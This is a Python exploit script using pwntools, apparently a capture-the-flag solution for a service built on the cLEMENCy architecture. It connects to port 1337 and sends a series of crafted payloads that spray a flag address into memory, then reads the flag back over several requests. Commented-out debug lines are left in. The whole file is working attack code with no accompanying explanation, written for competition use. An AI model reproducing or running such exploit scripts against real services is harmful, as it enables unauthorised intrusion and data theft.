from pwn import *
from clemency import *
import time

flag_addr = 0x4010000

def exploit(host):
    port = 1337
    r = remote(host, port)
    r = cyio(r)

    addr = 0x001cc05
    payload = [0x4f, 0x1b4, 0xe9, 0x10b, 0xa6, 0x1ce, 0x17, 0x16, 0x46, 0x55, 0x5a, 0x59, 0x4c, 0x4c, 0x31, 0x37]
    r.send(payload)
    r.recv(8)
    r.recv(8)
    r.recv(8)

    for i in range(34):
        p2=[0x10]+[0,1]+[0]*5 + [0]+[1]+[2,3,4,5,6,7]
        r.send(p2)
        r.recv(8)

    # raw_input('wait')
    head = [0x54, 0x20, 0x0, 0x31, 0xa9, 0xd1, 0xc9, 0x61]
    # r.send(payload)
    # r.recv(8)
    # raw_input('wait')
    # r.interactive()
    # r.send(payload)

    # 0x188, 0x1b8, 0x50, 0x0, 0x0, 0x0, 0x0]
    x = 36
    payload = [0x60]
    payload += p27(addr)
    for i in xrange(12):
        payload += p27(flag_addr + i)
    payload += p27(flag_addr)
    payload += p27(flag_addr + 8)
    payload += p27(flag_addr + 16)
    payload += p27(flag_addr + 24)
    left = (0x1ff * 8 - 4 - x - 12)
    for i in xrange(left / 3):
        payload += p27(flag_addr)
    payload += [0] * (0x1ff * 8 - len(payload))
    r.send(head + payload)
    time.sleep(0.2)
    hello = (p27(0x0) * 4 + p27(0x20) + p27(0x0)) * (0x1ff * 8 / 18)
    hello += [0] * (0x1ff * 8 - len(hello))
    r.send(hello)
    time.sleep(0.2)
    for i in xrange(0x1d):
        r.send([0x01] * (0x1ff * 8 - 4) + [0x0] * 4)
        time.sleep(0.2)

    r.send([0x0] * 2 + [0x01] * (0x1fd * 8) + [0x0] * 14)
    time.sleep(0.2)
    r.recv(8)
    # r.interactive()
    # r.interactive()
    # r.interactive()
    # raw_input('wait')
    # r.send([0x0] * 7)
    # r.recv(8)

    p3=[0x12]+[0,1]+[0]*5 + [0]+[1]+[2,3,4,5,6,7]
    r.send(p3)
    # print r.recv(8)
    r.recv(8)
    flag = r.recv(8)

    p3=[0x12]+[0,1]+[0]*5 + [1]+[1]+[2,3,4,5,6,7]
    r.send(p3)
    # print r.recv(8)
    r.recv(8)
    flag += r.recv(8)

    p3=[0x12]+[0,1]+[0]*5 + [2]+[1]+[2,3,4,5,6,7]
    r.send(p3)
    # print r.recv(8)
    r.recv(8)
    flag += r.recv(8)

    p3=[0x12]+[0,1]+[0]*5 + [3]+[1]+[2,3,4,5,6,7]
    r.send(p3)
    # print r.recv(8)
    r.recv(8)
    flag += r.recv(8)

    # print r.recv(8)
    # print r.recv(8)
    # print r.recv(8)
    r.close()

    return flag.strip('\x00')

if __name__ == '__main__':
   #  host = '10.5.2.2'
    host = '127.0.0.1'
    # print exploit(host)
    print exploit(host)
